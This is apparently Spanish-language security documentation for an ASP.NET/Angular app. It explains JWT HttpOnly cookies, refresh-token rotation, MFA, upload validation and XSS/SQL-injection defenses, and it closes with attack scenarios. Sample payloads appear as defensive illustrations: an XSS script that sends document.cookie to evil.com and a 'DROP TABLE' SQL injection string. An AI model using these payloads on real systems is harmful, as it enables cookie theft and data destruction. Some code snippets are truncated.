2. JWT en cookie HttpOnly

El JWT (JSON Web Token) es el mecanismo principal de autenticación. En lugar de enviarlo en el header Authorization: Bearer ... (como hacen muchas apps), aquí viaja en una cookie HttpOnly. Eso significa que JavaScript no puede leerla — aunque hubiera un ataque XSS, el atacante no puede robar el token.

2.1 Emisión del token

📄 AplicacionAPI/ClientManager.API/Services/AuthService.cs — GenerateAccessToken()
private string GenerateAccessToken(ApplicationUser user, string role, out DateTime expiresAt)
{
    var claims = new List<Claim>
    {
        new(JwtRegisteredClaimNames.Sub,   user.Id),          // ID del usuario
        new(JwtRegisteredClaimNames.Email, user.Email!),      // email
        new(JwtRegisteredClaimNames.Jti,   Guid.NewGuid().ToString()), // ID único del token
        new("role",          role),                           // rol: SuperAdmin o Cliente
        new("securityStamp", user.SecurityStamp ?? "")        // para invalidación inmediata
    };

    // Claims adicionales según rol:
    if (role == "SuperAdmin")
        claims.Add(new Claim("totpEnabled", user.TotpEnabled.ToString().ToLower()));
    if (role == "Cliente" && user.UserId.HasValue)
        claims.Add(new Claim("userId", user.UserId.Value.ToString()));

    // Firma con HMAC-SHA256 usando la clave secreta de User Secrets
    var key   = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secretKey));
    var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

    expiresAt = DateTime.UtcNow.AddMinutes(15);  // expira en 15 minutos

    var token = new JwtSecurityToken(
        issuer:            "ClientManagerAPI",
        audience:          "ClientManagerApp",
        claims:            claims,
        expires:           expiresAt,
        signingCredentials: creds
    );

    return new JwtSecurityTokenHandler().WriteToken(token);
}

El token contiene: quién eres (Sub/Email), qué puedes hacer (role), cuándo expira (exp), un ID único (Jti) y el SecurityStamp para invalidación. Todo firmado — si alguien modifica cualquier campo, la firma no cuadra y el backend lo rechaza.

2.2 La cookie

📄 AplicacionAPI/ClientManager.API/Controllers/AuthController.cs — SetAccessTokenCookie()
private void SetAccessTokenCookie(string token)
{
    Response.Cookies.Append("accessToken", token, new CookieOptions
    {
        HttpOnly = true,                    // JavaScript NO puede leerla
        Secure   = _isProduction,           // solo por HTTPS en producción
        SameSite = SameSiteMode.Strict,     // no viaja en peticiones cross-site
        Expires  = DateTimeOffset.UtcNow.AddMinutes(15)
    });
}

private void SetRefreshTokenCookie(string token)
{
    Response.Cookies.Append("refreshToken", token, new CookieOptions
    {
        HttpOnly = true,
        Secure   = _isProduction,
        SameSite = SameSiteMode.Strict,
        Expires  = DateTimeOffset.UtcNow.AddHours(24)
    });
}

2.3 Validación en cada request

📄 AplicacionAPI/ClientManager.API/Program.cs — líneas 53-96
// Leer el token desde la cookie (no del header Authorization)
options.Events = new JwtBearerEvents
{
    OnMessageReceived = ctx =>
    {
        var cookie = ctx.Request.Cookies["accessToken"];
        if (!string.IsNullOrEmpty(cookie))
            ctx.Token = cookie;      // usar la cookie en lugar del header
        return Task.CompletedTask;
    }
}

// Parámetros de validación:
ValidateIssuer           = true,    // debe ser "ClientManagerAPI"
ValidateAudience         = true,    // debe ser "ClientManagerApp"
ValidateLifetime         = true,    // no aceptar tokens expirados
ValidateIssuerSigningKey = true,    // verificar la firma HMAC-SHA256
ClockSkew                = TimeSpan.Zero  // sin margen de tiempo — expira al segundo
ClockSkew = Zero: por defecto ASP.NET da 5 minutos de margen tras la expiración. Con Zero se elimina ese margen — si el token dice que expira a las 12:15:00, a las 12:15:01 ya no vale.

2.4 SecurityStamp — invalidación inmediata

📄 Program.cs — OnTokenValidated (líneas 80-95)
OnTokenValidated = async ctx =>
{
    var userManager = ctx.HttpContext.RequestServices
        .GetRequiredService<UserManager<ApplicationUser>>();

    var userId = ctx.Principal?.FindFirst(JwtRegisteredClaimNames.Sub)?.Value;
    var user   = await userManager.FindByIdAsync(userId);

    var tokenStamp = ctx.Principal?.FindFirst("securityStamp")?.Value;
    if (tokenStamp != user.SecurityStamp)
        ctx.Fail("Sesión invalidada.");  // → 401 inmediato
}

El SecurityStamp es un GUID que Identity regenera automáticamente cuando cambias la contraseña, el email o los roles. Se incluye en el JWT al firmarlo. En cada request, el backend lo compara con el de la BD. Si no coincide → 401.

¿Para qué sirve? Si alguien roba el JWT de un usuario y ese usuario cambia su contraseña, el stamp cambia. El siguiente request del atacante recibe 401 aunque el JWT aún no haya expirado. Invalidación inmediata sin esperar los 15 minutos.

3. Refresh token rotativo

El access token (JWT) dura solo 15 minutos para limitar el daño si es interceptado. Pero obligar al usuario a hacer login cada 15 minutos sería horrible. Los refresh tokens resuelven esto: permiten obtener un nuevo access token sin hacer login.

3.1 Creación

📄 AuthService.cs — CreateRefreshTokenAsync()
private async Task<RefreshToken> CreateRefreshTokenAsync(string userId)
{
    var tokenBytes = new byte[32];
    RandomNumberGenerator.Fill(tokenBytes);  // 32 bytes aleatorios criptográficamente seguros

    var refreshToken = new RefreshToken
    {
        Token     = Convert.ToBase64String(tokenBytes),  // 256 bits de entropía
        UserId    = userId,
        ExpiresAt = DateTime.UtcNow.AddHours(24)         // válido 24 horas
    };

    _db.RefreshTokens.Add(refreshToken);
    await _db.SaveChangesAsync();
    return refreshToken;
}

El modelo en BD tiene: Token, UserId, ExpiresAt, RevokedAt, ReplacedByToken. La propiedad IsActive se calcula: RevokedAt is null && DateTime.UtcNow < ExpiresAt.

3.2 Rotación — cada uso genera uno nuevo

📄 AuthService.cs — RefreshAsync()
public async Task<TokenResponseDto> RefreshAsync(string refreshToken)
{
    var stored = await _db.RefreshTokens
        .Include(r => r.User)
        .FirstOrDefaultAsync(r => r.Token == refreshToken);

    if (stored is null || !stored.IsActive)
        throw new UnauthorizedAccessException("Refresh token inválido o expirado.");

    // Generar nuevos tokens
    var newAccessToken  = GenerateAccessToken(user, role, out var expiresAt);
    var newRefreshToken = await CreateRefreshTokenAsync(user.Id);

    // Revocar el token antiguo y registrar cuál lo reemplaza
    stored.RevokedAt       = DateTime.UtcNow;
    stored.ReplacedByToken = newRefreshToken.Token;  // trazabilidad
    await _db.SaveChangesAsync();

    return new TokenResponseDto { AccessToken = newAccessToken, RefreshToken = newRefreshToken.Token, ... };
}
Por qué la rotación es importante: si alguien roba un refresh token, puede usarlo una sola vez. En el momento en que el usuario legítimo intenta refrescar, usa el mismo token pero ya fue revocado → 401. La cadena ReplacedByToken permite detectar que ese token ya fue usado y que hay una posible sesión comprometida.

3.4 Refresh automático en el frontend

📄 AplicacionAPI/ClientManagerWeb/src/app/interceptors/auth.interceptor.ts
// Candado global — compartido entre TODAS las peticiones
let isRefreshing = false;
const refreshResult$ = new BehaviorSubject<boolean | null>(null);

// Cuando llega un 401:
if (isRefreshing) {
    // Otra petición ya está renovando — esperar al resultado
    return refreshResult$.pipe(
        filter(result => result !== null),
        take(1),
        switchMap(success => success ? next(reqWithCreds) : throwError(() => error))
    );
}

// Primera petición en fallar: tomar el control
isRefreshing = true;
refreshResult$.next(null);

return from(authService.refresh()).pipe(
    switchMap(success => {
        isRefreshing = false;
        refreshResult$.next(success);  // notificar a las peticiones en espera
        return success ? next(reqWithCreds) : throwError(() => error);
    })
);
El candado evita que si llegan 5 peticiones simultáneas con 401, las 5 intenten hacer el refresh a la vez. Solo una lo hace. Las demás esperan el resultado en el BehaviorSubject y reintentan cuando termina.

4. Doble factor (MFA)

Ambos roles tienen MFA obligatorio pero de distinto tipo:

SuperAdmin → TOTP

Google Authenticator genera un código nuevo cada 30 segundos. No requiere conexión a internet ni email. El secreto está en el móvil.

Cliente → Email OTP

Se envía un código de 6 dígitos al email. Expira en 30 segundos. Máximo 3 intentos antes de invalidarse.

4.1 TOTP — Google Authenticator

4.2 Email OTP

📄 AuthService.cs — LoginAsync(), ResendOtpAsync(), MfaVerifyAsync()
📄 Models/EmailOtpCode.cs
// 1. Generar código de 6 dígitos con CSPRNG
var bytes = new byte[4];
RandomNumberGenerator.Fill(bytes);
var code = (Math.Abs(BitConverter.ToInt32(bytes, 0)) % 1_000_000).ToString("D6");

// 2. Hashear con SHA-256 antes de guardar en BD (nunca en claro)
var codeHash = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(code)));

// 3. Guardar en BD
_db.EmailOtpCodes.Add(new EmailOtpCode {
    UserId    = user.Id,
    CodeHash  = codeHash,
    ExpiresAt = DateTime.UtcNow.AddSeconds(30),  // expira en 30 segundos
    Attempts  = 0
});

// 4. Invalidar OTPs anteriores del mismo usuario
var previousOtps = await _db.EmailOtpCodes
    .Where(o => o.UserId == user.Id && !o.IsUsed && o.ExpiresAt > DateTime.UtcNow)
    .ToListAsync();
foreach (var old in previousOtps) old.IsUsed = true;

Verificación con control de intentos

// Máximo 3 intentos
if (otp.Attempts >= 3) {
    otp.IsUsed = true;
    throw new UnauthorizedAccessException("Demasiados intentos. Inicia sesión de nuevo.");
}

// Comparar hash
var inputHash = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(dto.Code)));
if (otp.CodeHash != inputHash) {
    otp.Attempts++;
    var remaining = 3 - otp.Attempts;
    throw new UnauthorizedAccessException($"Código incorrecto. Te quedan {remaining} intentos.");
}

otp.IsUsed = true;  // marcar como usado — no se puede reutilizar

4.3 Códigos de respaldo TOTP

📄 AuthService.cs — TotpConfirmAsync()
// Generar 8 códigos de respaldo al activar TOTP
var plainCodes = Enumerable.Range(0, 8).Select(_ => {
    var bytes = new byte[4];
    RandomNumberGenerator.Fill(bytes);
    var hex = Convert.ToHexString(bytes).ToLower();
    return $"{hex[..4]}-{hex[4..]}";   // formato: xxxx-xxxx
}).ToList();

// Guardar SOLO los hashes SHA-256 en BD (nunca los códigos en claro)
user.TotpBackupCodes = JsonSerializer.Serialize(
    plainCodes.Select(c =>
        Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(c.Replace("-", ""))))
    ).ToList()
);

// Los códigos en claro se devuelven al usuario UNA SOLA VEZ en la respuesta
Los backup codes se muestran al usuario solo una vez al activar TOTP. Después no se pueden recuperar — solo los hashes están en BD. Si los pierde, tiene que desactivar y reactivar TOTP.

Uso de un backup code

// En MfaVerifyAsync() — si el código tiene 8 chars (sin guión) es backup
var isBackupAttempt = normalizedCode.Length == 8;

if (isBackupAttempt) {
    var inputHash    = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(normalizedCode)));
    var storedHashes = JsonSerializer.Deserialize<List<string>>(user.TotpBackupCodes);
    var matchIndex   = storedHashes.FindIndex(h => h.Equals(inputHash, StringComparison.OrdinalIgnoreCase));

    if (matchIndex < 0) throw new UnauthorizedAccessException("Código de respaldo incorrecto o ya usado.");

    storedHashes.RemoveAt(matchIndex);  // consumir el código — no se puede reusar
    user.TotpBackupCodes = JsonSerializer.Serialize(storedHashes);
    await _userManager.UpdateAsync(user);
}

5. Lockout de cuentas

📄 Program.cs — configuración de Identity (líneas 23-38)

El lockout devuelve HTTP 423 (Locked), mientras que las credenciales incorrectas devuelven 401. Esto permite al frontend mostrar mensajes distintos pero sin revelar al atacante si la cuenta existe o no.

7. CORS y SameSite

CORS — controlar qué orígenes pueden llamar a la API

📄 Program.cs — líneas 151-165
📄 appsettings.json — Cors:AllowedOrigins
// Los orígenes permitidos vienen de configuración (no hardcoded):
var corsOrigins = builder.Configuration
    .GetSection("Cors:AllowedOrigins")
    .Get<string[]>();

policy.WithOrigins(corsOrigins)    // solo estos orígenes
      .AllowAnyMethod()            // GET, POST, PUT, DELETE
      .AllowAnyHeader()            // cualquier header
      .AllowCredentials();         // necesario para que el browser envíe cookies
// En appsettings.json — en producción cambiar a la URL real:
"Cors": {
  "AllowedOrigins": [ "http://localhost:4200" ]
}
AllowCredentials() es obligatorio cuando usas cookies. Sin él, el navegador no adjunta las cookies aunque el origen esté permitido.

SameSite=Strict — protección CSRF adicional

Aunque el CORS controla desde qué orígenes puede hacer peticiones el JavaScript, SameSite=Strict añade una capa extra: el navegador directamente no adjunta las cookies si la petición viene de otro dominio, aunque sea una petición de formulario HTML (que no pasa por CORS).

8. HTTPS y HSTS

📄 Program.cs — líneas 222-224
if (!app.Environment.IsDevelopment())
    app.UseHsts();          // activa HSTS en producción
app.UseHttpsRedirection();  // redirige HTTP → HTTPS siempre

HSTS (HTTP Strict Transport Security) envía esta cabecera al navegador:

Strict-Transport-Security: max-age=2592000   // 30 días

El navegador la guarda y durante 30 días, aunque el usuario teclee http://, el navegador lo cambia a https:// antes de salir a la red. Esto previene ataques SSL stripping en redes WiFi públicas.

No se activa en Development porque trabajas con localhost por HTTP. Si lo activaras, el navegador recordaría "localhost = solo HTTPS" durante 30 días y rompería otros proyectos locales.

9. Validación de archivos (magic bytes)

📄 Services/CompanyService.cs — SaveLogoAsync(), HasValidMagicBytes()

Al subir el logo de una empresa se aplican 4 validaciones en cadena:

private async Task<string> SaveLogoAsync(IFormFile file, CancellationToken ct)
{
    // 1. Tamaño máximo 5 MB
    if (file.Length > 5 * 1024 * 1024)
        throw new ArgumentException("El archivo no puede superar los 5 MB.");

    // 2. Extensión permitida (controlada por el cliente — no confiable)
    var extension = Path.GetExtension(file.FileName).ToLowerInvariant();
    if (!AllowedExtensions.Contains(extension))  // .jpg .jpeg .png .gif .webp
        throw new ArgumentException("Formato no permitido.");

    // 3. MIME type (declarado por el cliente — no confiable)
    if (!AllowedMimeTypes.Contains(file.ContentType.ToLowerInvariant()))
        throw new ArgumentException("Tipo MIME no válido.");

    // 4. Magic bytes — los primeros bytes del fichero real (esto SÍ es confiable)
    await using var readStream = file.OpenReadStream();
    var header = new byte[12];
    await readStream.ReadExactlyAsync(header.AsMemory(0, 12), ct);

    if (!HasValidMagicBytes(header, extension))
        throw new ArgumentException("El contenido no coincide con el formato declarado.");

    // Nombre aleatorio con UUID — evita path traversal y colisiones
    var fileName = $"{Guid.NewGuid()}{extension}";
    var filePath = Path.Combine(_env.WebRootPath, "uploads", fileName);

    readStream.Position = 0;
    await using var fileStream = new FileStream(filePath, FileMode.Create);
    await readStream.CopyToAsync(fileStream, ct);

    return fileName;
}
// Firmas binarias de cada formato:
private static bool HasValidMagicBytes(byte[] h, string extension) => extension switch
{
    ".jpg" or ".jpeg" => h[0] == 0xFF && h[1] == 0xD8 && h[2] == 0xFF,
    ".png"  => h[0] == 0x89 && h[1] == 0x50 && h[2] == 0x4E && h[3] == 0x47,
    ".gif"  => h[0] == 0x47 && h[1] == 0x49 && h[2] == 0x46 && h[3] == 0x38,
    ".webp" => h[0] == 0x52 && h[1] == 0x49 && h[2] == 0x46 && h[3] == 0x46
            && h[8] == 0x57 && h[9] == 0x45 && h[10] == 0x42 && h[11] == 0x50,
    _ => false
};

📄 guards/auth.guard.ts · admin.guard.ts · guest.guard.ts
Los guards del frontend son UX, no seguridad real. La seguridad real está en el backend con [Authorize]. Los guards evitan que el usuario vea páginas que no debería y mejoran la experiencia, pero un atacante con conocimientos podría saltárselos. La API lo rechazaría igualmente.

  return router.createUrlTree(['/login'], { queryParams: { returnUrl: state.url } });

adminGuard — ¿eres SuperAdmin con TOTP activo?

export const adminGuard: CanActivateFn = () => {

  const router = inject(Router);

    return router.createUrlTree(['/perfil']);      // Cliente → a su perfil

  return true;
};

11. Protección XSS

XSS (Cross-Site Scripting) es cuando un atacante consigue que código JavaScript malicioso se ejecute en el navegador de otro usuario. Por ejemplo, si una empresa se llama <script>robarCookies()</script> y se renderiza sin escapar.

Capa 1 — Angular escapa por defecto

Toda interpolación con {{ }} en Angular escapa automáticamente los caracteres HTML peligrosos. No hay que hacer nada:

<!-- Angular convierte <script> en texto literal, no lo ejecuta -->
<span>{{ company.name }}</span>

<!-- PELIGROSO — nunca usar [innerHTML] con datos del usuario -->
<span [innerHTML]="company.name"></span>  // ← esto sí ejecutaría el script

En toda la app no hay ningún uso de [innerHTML], bypassSecurityTrustHtml() ni eval().

Capa 2 — Identidad en memoria, no en localStorage

📄 services/auth.service.ts
// La identidad vive en un signal privado en memoria
private readonly _identity = signal<Identity | null>(null);

// Nunca en localStorage ni sessionStorage:
// ❌ localStorage.setItem('token', accessToken)   ← no existe en el código
// ❌ localStorage.setItem('role', userRole)        ← no existe en el código
Si hubiera un XSS, el atacante podría ejecutar código en el contexto del usuario. Pero no podría robar el JWT (está en cookie HttpOnly) ni el rol (está en memoria, no en localStorage). Lo más que podría hacer es llamar a la API en nombre del usuario durante esa sesión — limitado y ruidoso.

Capa 3 — Cookie HttpOnly

Aunque hubiera XSS, document.cookie no devuelve cookies marcadas como HttpOnly. El atacante no puede robar el access token ni el refresh token.

Capa 4 — SameSite=Strict

Aunque el atacante consiguiera ejecutar JS desde evil.com, las peticiones a la API no llevarían cookies porque el navegador las bloquea con SameSite=Strict.

12. Contraseñas

Hash con PBKDF2 — ASP.NET Identity

Las contraseñas nunca se guardan en claro. Identity las hashea automáticamente con PBKDF2 (Password-Based Key Derivation Function 2):

  • Algoritmo: HMAC-SHA256
  • Iteraciones: 10.000 (hace el hash lento a propósito — dificulta fuerza bruta)
  • Sal: 16 bytes aleatorios por usuario (cada hash es único aunque la contraseña sea igual)

Si se filtra la BD, romper una contraseña requeriría meses de cómputo.

13. Anti-enumeración de usuarios

La enumeración de usuarios es cuando un atacante puede descubrir qué emails están registrados en el sistema probando respuestas distintas.

📄 AuthController.cs — ForgotPassword(), ResendOtp()

{

    if (user is null)
    {
        _logger.LogInformation("ForgotPassword solicitado para email no registrado.");

    }

15. Limpieza automática de BD

📄 Services/CleanupHostedService.cs

Un servicio en background se ejecuta cada hora y elimina tokens y OTPs expirados para que las tablas no crezcan indefinidamente con datos caducados.

protected override async Task ExecuteAsync(CancellationToken stoppingToken)
{
    while (!stoppingToken.IsCancellationRequested)
    {
        await DoCleanupAsync(stoppingToken);
        await Task.Delay(TimeSpan.FromHours(1), stoppingToken);  // cada hora
    }
}

private async Task DoCleanupAsync(CancellationToken ct)
{
    // Eliminar refresh tokens expirados (EF8 — DELETE directo, sin materializar)
    var refreshDeleted = await db.RefreshTokens
        .Where(r => r.ExpiresAt < now)
        .ExecuteDeleteAsync(ct);

    // Eliminar OTPs expirados o ya usados
    var otpDeleted = await db.EmailOtpCodes
        .Where(o => o.ExpiresAt < now || o.IsUsed)
        .ExecuteDeleteAsync(ct);
}
Usar ExecuteDeleteAsync() hace un DELETE FROM ... WHERE directo en la BD sin cargar los registros en memoria primero — mucho más eficiente que cargarlos y luego borrarlos.

16. SQL Injection

Una inyección SQL ocurre cuando datos del usuario se concatenan directamente en una consulta SQL:

// VULNERABLE (no existe en el código, ejemplo de lo que NO se hace):
var sql = $"SELECT * FROM Companies WHERE Name = '{dto.Name}'";
// Si dto.Name = "'; DROP TABLE Companies; --" → destruye la BD

En este proyecto es imposible porque toda la persistencia usa Entity Framework Core con LINQ. EF traduce LINQ a SQL parametrizado automáticamente:

📄 Services/CompanyService.cs · UserService.cs
// EF Core genera automáticamente SQL parametrizado:
var companies = await _db.Companies
    .Where(c => c.Name.ToLower().StartsWith(name.ToLower()))
    .ToListAsync();

// SQL generado internamente por EF:
// SELECT * FROM "Companies" WHERE lower("Name") LIKE @p0 + '%'
// @p0 = 'valor_del_usuario'   ← parámetro separado, nunca concatenado

El único uso de SQL raw es en el arranque para comprobar si existe la tabla de migraciones. Es un literal sin parámetros de usuario, así que no hay riesgo:

📄 Program.cs — línea 442
cmd.CommandText = "SELECT EXISTS(SELECT 1 FROM information_schema.tables WHERE ...)";
// Literal fijo, sin ningún input del usuario

17. Flujos de ataque y defensa

Escenario 1 — Ataque de fuerza bruta al login

Atacante prueba 100 contraseñas contra admin@clientmanager.local

Intento 1-5: AuthService → AccessFailedAsync() incrementa contador
Rate limiter cuenta 5 peticiones en 1 minuto

Intento 6: Rate limiter → 429 Too Many Requests
(el atacante tiene que esperar 1 minuto)

Si el atacante espera y llega al intento 5+1=6 total:
IsLockedOutAsync() → true → 423 Locked
Cuenta bloqueada 1 minuto independientemente del rate limit

Resultado: el atacante necesita >1 minuto por cada 5 intentos → inviable a escala

Escenario 2 — Robo del JWT

Atacante consigue el JWT de alguna forma (no via XSS — está en cookie HttpOnly)

Intento de uso: JWT tiene 15 minutos de vida → si ya expiró, 401 inmediato

Si aún no expiró:
→ El backend verifica SecurityStamp en cada request
→ Si el usuario legítimo cambió su contraseña mientras tanto → 401
→ Si no cambió contraseña: el atacante tiene acceso máximo 15 minutos

Mitigación: el usuario puede cambiar contraseña → SecurityStamp cambia →
todas las sesiones (incluida la del atacante) → 401 inmediato

Escenario 3 — Robo del refresh token

Atacante consigue un refresh token activo

Si el atacante lo usa ANTES que el usuario legítimo:
→ Obtiene nuevos tokens
→ El token original queda revocado (ReplacedByToken registrado)
→ Cuando el usuario legítimo intenta refrescar → 401
→ El usuario ve que algo va mal y cambia contraseña
→ Al cambiar contraseña: TODOS los refresh tokens se revocan
→ El atacante pierde acceso

Si el usuario legítimo lo usa ANTES:
→ Token del atacante ya fue revocado
→ 401 si intenta usarlo

Escenario 4 — Intento de subir un archivo malicioso

Atacante sube "malware.exe" renombrado como "logo.png"

CompanyService.SaveLogoAsync():
Paso 1: file.Length ≤ 5MB → pasa (asumiendo que es pequeño)
Paso 2: extensión .png → pasa (la extensión es la declarada)
Paso 3: Content-Type image/png → pasa (el cliente lo declara)
Paso 4: Magic bytes → lee primeros 12 bytes del fichero real
EXE empieza con 4D 5A (MZ), no con 89 50 4E 47 (PNG)
→ ArgumentException: "El contenido no coincide con el formato declarado"
→ 400 Bad Request

El archivo nunca llega al disco

Escenario 5 — Ataque XSS

Atacante crea empresa con nombre: <script>fetch('evil.com?c='+document.cookie)</script>

Backend: guarda el string tal cual en BD (no lo modifica)

Frontend: Angular renderiza {{ company.name }}
→ Convierte < a &lt;, > a &gt;
→ La pantalla muestra el texto literal, no ejecuta nada

Si por algún motivo el script se ejecutara:
→ document.cookie → vacío (accessToken y refreshToken son HttpOnly)
→ No puede robar las credenciales de sesión
→ SameSite=Strict impide usar las cookies desde evil.com
